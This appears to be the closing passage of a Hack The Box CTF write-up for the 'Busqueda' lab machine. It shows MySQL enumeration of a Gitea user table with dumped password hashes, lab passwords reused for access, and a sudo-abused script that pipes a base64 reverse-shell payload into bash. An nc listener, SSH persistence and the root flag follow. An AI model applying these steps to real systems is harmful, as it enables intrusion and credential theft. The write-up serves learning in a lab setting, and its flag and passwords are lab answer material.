+</span><span class="z-text z-plain">| badge                     |
+</span><span class="z-text z-plain">| collaboration             |
+</span><span class="z-text z-plain">| comment                   |
+</span><span class="z-text z-plain">| commit_status             |
+</span><span class="z-text z-plain">| commit_status_index       |
+</span><span class="z-text z-plain">| deleted_branch            |
+</span><span class="z-text z-plain">| deploy_key                |
+</span><span class="z-text z-plain">| email_address             |
+</span><span class="z-text z-plain">| email_hash                |
+</span><span class="z-text z-plain">| external_login_user       |
+</span><span class="z-text z-plain">| follow                    |
+</span><span class="z-text z-plain">| foreign_reference         |
+</span><span class="z-text z-plain">| gpg_key                   |
+</span><span class="z-text z-plain">| gpg_key_import            |
+</span><span class="z-text z-plain">| hook_task                 |
+</span><span class="z-text z-plain">| issue                     |
+</span><span class="z-text z-plain">| issue_assignees           |
+</span><span class="z-text z-plain">| issue_content_history     |
+</span><span class="z-text z-plain">| issue_dependency          |
+</span><span class="z-text z-plain">| issue_index               |
+</span><span class="z-text z-plain">| issue_label               |
+</span><span class="z-text z-plain">| issue_user                |
+</span><span class="z-text z-plain">| issue_watch               |
+</span><span class="z-text z-plain">| label                     |
+</span><span class="z-text z-plain">| language_stat             |
+</span><span class="z-text z-plain">| lfs_lock                  |
+</span><span class="z-text z-plain">| lfs_meta_object           |
+</span><span class="z-text z-plain">| login_source              |
+</span><span class="z-text z-plain">| milestone                 |
+</span><span class="z-text z-plain">| mirror                    |
+</span><span class="z-text z-plain">| notice                    |
+</span><span class="z-text z-plain">| notification              |
+</span><span class="z-text z-plain">| oauth2_application        |
+</span><span class="z-text z-plain">| oauth2_authorization_code |
+</span><span class="z-text z-plain">| oauth2_grant              |
+</span><span class="z-text z-plain">| org_user                  |
+</span><span class="z-text z-plain">| package                   |
+</span><span class="z-text z-plain">| package_blob              |
+</span><span class="z-text z-plain">| package_blob_upload       |
+</span><span class="z-text z-plain">| package_file              |
+</span><span class="z-text z-plain">| package_property          |
+</span><span class="z-text z-plain">| package_version           |
+</span><span class="z-text z-plain">| project                   |
+</span><span class="z-text z-plain">| project_board             |
+</span><span class="z-text z-plain">| project_issue             |
+</span><span class="z-text z-plain">| protected_branch          |
+</span><span class="z-text z-plain">| protected_tag             |
+</span><span class="z-text z-plain">| public_key                |
+</span><span class="z-text z-plain">| pull_auto_merge           |
+</span><span class="z-text z-plain">| pull_request              |
+</span><span class="z-text z-plain">| push_mirror               |
+</span><span class="z-text z-plain">| reaction                  |
+</span><span class="z-text z-plain">| release                   |
+</span><span class="z-text z-plain">| renamed_branch            |
+</span><span class="z-text z-plain">| repo_archiver             |
+</span><span class="z-text z-plain">| repo_indexer_status       |
+</span><span class="z-text z-plain">| repo_redirect             |
+</span><span class="z-text z-plain">| repo_topic                |
+</span><span class="z-text z-plain">| repo_transfer             |
+</span><span class="z-text z-plain">| repo_unit                 |
+</span><span class="z-text z-plain">| repository                |
+</span><span class="z-text z-plain">| review                    |
+</span><span class="z-text z-plain">| review_state              |
+</span><span class="z-text z-plain">| session                   |
+</span><span class="z-text z-plain">| star                      |
+</span><span class="z-text z-plain">| stopwatch                 |
+</span><span class="z-text z-plain">| system_setting            |
+</span><span class="z-text z-plain">| task                      |
+</span><span class="z-text z-plain">| team                      |
+</span><span class="z-text z-plain">| team_invite               |
+</span><span class="z-text z-plain">| team_repo                 |
+</span><span class="z-text z-plain">| team_unit                 |
+</span><span class="z-text z-plain">| team_user                 |
+</span><span class="z-text z-plain">| topic                     |
+</span><span class="z-text z-plain">| tracked_time              |
+</span><span class="z-text z-plain">| two_factor                |
+</span><span class="z-text z-plain">| upload                    |
+</span><span class="z-text z-plain">| user                      |
+</span><span class="z-text z-plain">| user_badge                |
+</span><span class="z-text z-plain">| user_open_id              |
+</span><span class="z-text z-plain">| user_redirect             |
+</span><span class="z-text z-plain">| user_setting              |
+</span><span class="z-text z-plain">| version                   |
+</span><span class="z-text z-plain">| watch                     |
+</span><span class="z-text z-plain">| webauthn_credential       |
+</span><span class="z-text z-plain">| webhook                   |
+</span><span class="z-text z-plain">+---------------------------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>There's a lot of tables! But <code>user</code> is probably the most interesting.</p>
+<h4 id="user-s-columns"><code>user</code>'s columns</h4>
+<p>Let's continue our enumeration of this database by checking the content of the
+<code>user</code> table.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SELECT column_type, column_name FROM information_schema.columns WHERE table_name = <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>user<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">+---------------+--------------------------------+
+</span><span class="z-text z-plain">| COLUMN_TYPE   | COLUMN_NAME                    |
+</span><span class="z-text z-plain">+---------------+--------------------------------+
+</span><span class="z-text z-plain">| tinyint(1)    | allow_create_organization      |
+</span><span class="z-text z-plain">| tinyint(1)    | allow_git_hook                 |
+</span><span class="z-text z-plain">| tinyint(1)    | allow_import_local             |
+</span><span class="z-text z-plain">| varchar(2048) | avatar                         |
+</span><span class="z-text z-plain">| varchar(255)  | avatar_email                   |
+</span><span class="z-text z-plain">| bigint        | created_unix                   |
+</span><span class="z-text z-plain">| varchar(255)  | description                    |
+</span><span class="z-text z-plain">| varchar(255)  | diff_view_style                |
+</span><span class="z-text z-plain">| varchar(255)  | email                          |
+</span><span class="z-text z-plain">| varchar(20)   | email_notifications_preference |
+</span><span class="z-text z-plain">| varchar(255)  | full_name                      |
+</span><span class="z-text z-plain">| bigint        | id                             |
+</span><span class="z-text z-plain">| tinyint(1)    | is_active                      |
+</span><span class="z-text z-plain">| tinyint(1)    | is_admin                       |
+</span><span class="z-text z-plain">| tinyint(1)    | is_restricted                  |
+</span><span class="z-text z-plain">| tinyint(1)    | keep_activity_private          |
+</span><span class="z-text z-plain">| tinyint(1)    | keep_email_private             |
+</span><span class="z-text z-plain">| varchar(5)    | language                       |
+</span><span class="z-text z-plain">| bigint        | last_login_unix                |
+</span><span class="z-text z-plain">| tinyint(1)    | last_repo_visibility           |
+</span><span class="z-text z-plain">| varchar(255)  | location                       |
+</span><span class="z-text z-plain">| varchar(255)  | login_name                     |
+</span><span class="z-text z-plain">| bigint        | login_source                   |
+</span><span class="z-text z-plain">| int           | login_type                     |
+</span><span class="z-text z-plain">| varchar(255)  | lower_name                     |
+</span><span class="z-text z-plain">| int           | max_repo_creation              |
+</span><span class="z-text z-plain">| tinyint(1)    | must_change_password           |
+</span><span class="z-text z-plain">| varchar(255)  | name                           |
+</span><span class="z-text z-plain">| int           | num_followers                  |
+</span><span class="z-text z-plain">| int           | num_following                  |
+</span><span class="z-text z-plain">| int           | num_members                    |
+</span><span class="z-text z-plain">| int           | num_repos                      |
+</span><span class="z-text z-plain">| int           | num_stars                      |
+</span><span class="z-text z-plain">| int           | num_teams                      |
+</span><span class="z-text z-plain">| varchar(255)  | passwd                         |
+</span><span class="z-text z-plain">| varchar(255)  | passwd_hash_algo               |
+</span><span class="z-text z-plain">| tinyint(1)    | prohibit_login                 |
+</span><span class="z-text z-plain">| varchar(32)   | rands                          |
+</span><span class="z-text z-plain">| tinyint(1)    | repo_admin_change_team_access  |
+</span><span class="z-text z-plain">| varchar(32)   | salt                           |
+</span><span class="z-text z-plain">| varchar(255)  | theme                          |
+</span><span class="z-text z-plain">| int           | type                           |
+</span><span class="z-text z-plain">| bigint        | updated_unix                   |
+</span><span class="z-text z-plain">| tinyint(1)    | use_custom_avatar              |
+</span><span class="z-text z-plain">| int           | visibility                     |
+</span><span class="z-text z-plain">| varchar(255)  | website                        |
+</span><span class="z-text z-plain">+---------------+--------------------------------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Okay, so this table contains 46 columns.</p>
+<h4 id="users-s-columns-content"><code>users</code>'s columns content</h4>
+<p>Let's retrieve the content of the <code>username</code> and <code>passwd</code> columns.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SELECT name, passwd_hash_algo, salt, passwd FROM user</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">+---------------+------------------+----------------------------------+------------------------------------------------------------------------------------------------------+
+</span><span class="z-text z-plain">| name          | passwd_hash_algo | salt                             | passwd                                                                                               |
+</span><span class="z-text z-plain">+---------------+------------------+----------------------------------+------------------------------------------------------------------------------------------------------+
+</span><span class="z-text z-plain">| administrator | pbkdf2           | a378d3f64143b284f104c926b8b49dfb | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
+</span><span class="z-text z-plain">| cody          | pbkdf2           | d1db0a75a18e50de754be2aafcad5533 | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
+</span><span class="z-text z-plain">+---------------+------------------+----------------------------------+------------------------------------------------------------------------------------------------------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>We get the hashing algorithm, salt and password hash for <code>administrator</code> and
+<code>cody</code>.</p>
+<p>The issue is that we don't know the number of rounds applied to these hashes, so
+we can't crack them.</p>
+<h1 id="host-10-10-11-208-1">Host <code>10.10.11.208</code></h1>
+<h2 id="services-enumeration-3">Services enumeration</h2>
+<h3 id="apache-2">Apache</h3>
+<h4 id="exploration-4">Exploration</h4>
+<p>Let's think for a while. We have two passwords at our disposal:
+<code>jh1usoih2bkjaspwe92</code> used by <code>cody</code>, and <code>yuiu1hoiu4i5ho1uh</code> used by Gitea to
+log in to the MySQL database. If <code>cody</code> and <code>administrator</code> are two separate
+accounts, <code>administrator</code> is probably the one that set up the Gitea server.
+Maybe he reuses his password?</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/subdomain-administrator-user.png" alt="Subdomain administrator user" /></p>
+<p>It worked! He indeed reuses his credentials.</p>
+<p>We notice that <code>administrator</code> has a <code>scripts</code> repository. Let's check it.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/subdomain-scripts-repository.png" alt="Subdomain scripts repository" /></p>
+<p>This is the repository corresponding to the <code>/opt/scripts</code> folder!</p>
+<p>If we check <code>system-checkup.py</code>, we see that the <code>docker-inspect</code> argument
+actually corresponds to the <code>docker inspect</code> command, and <code>docker-ps</code> to
+<code>docker ps</code>. The <code>full-checkup</code> command tries to execute the <code>full-checkup.sh</code>
+script located in the current directory, and prints an error if it fails.</p>
+<h2 id="privilege-escalation-sudo-permissions">Privilege escalation (Sudo permissions)</h2>
+<p>Since we can execute <code>/opt/scripts/system-checkup.py</code> as <code>root</code> and that the
+<code>full-checkup</code> argument runs the <code>full-checkup.sh</code> script in the current
+directory as <code>root</code>, we simply have to create a <code>full-checkup.sh</code> file to
+execute it as <code>root</code>!</p>
+<h3 id="preparation-1">Preparation</h3>
+<p>The goal is to obtain a reverse shell.</p>
+<p>First, I'll setup a listener to receive the shell.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9002<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
+<a href="https://www.revshells.com/">RevShells</a> configured to obtain a <code>/bin/bash</code>
+shell.</p>
+<h3 id="exploitation-1">Exploitation</h3>
+<p>Let's create a <code>full-checkup.sh</code> file in the current directory containing our
+payload:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">!/bin/bash</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/bin/echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&lt;</span>BASE64_REVSHELL_PAYLOAD<span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> </span><span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/usr/bin/base64</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/bin/bash</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span></span>
+</span></code></pre>
+<p>Then, let's make it executable.</p>
+<p>Finally, let's abuse our <code>sudo</code> permissions to execute our script as <code>root</code>:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:/tmp$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/bin/python3<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/opt/scripts/system-checkup.py<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>full-checkup<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>If we check our listener:</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.10] from (UNKNOWN) [10.10.11.208] 36570
+</span><span class="z-text z-plain">root@busqueda:/tmp#
+</span></code></pre>
+<p>It caught the reverse shell!</p>
+<h3 id="establishing-persistence">Establishing persistence</h3>
+<p>Let's use SSH to establish persistence.</p>
+<p>Our home folder doesn't contain a <code>.ssh</code> folder, so I'll create one. Then I'll
+create a private key, and I'll add the corresponding public key to
+<code>authorized_keys</code>. Finally, I'll connect over SSH to Busqueda as <code>root</code>.</p>
+<h2 id="system-enumeration-2">System enumeration</h2>
+<p>If we run <code>whoami</code>, we see that we're <code>root</code>!</p>
+<h3 id="flags-1">Flags</h3>
+<p>As usual, we can find the root flag in our home folder.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>#</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/root/root.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">f1ce7cfa47de5bc95bbbe023750c2a63
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/success.png" alt="Success" /></p>
+<p>That's it for this box! 🎉</p>
+<p>I rated the user flag as 'Very easy' and the root flag as 'Not too easy'. The
+foothold was really easy to find and to exploit, it just required a bit of
+reasearch. However, I found the privilege escalation much harder and longer, as
+it was hard to identify and to find how to chain the information we gained.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
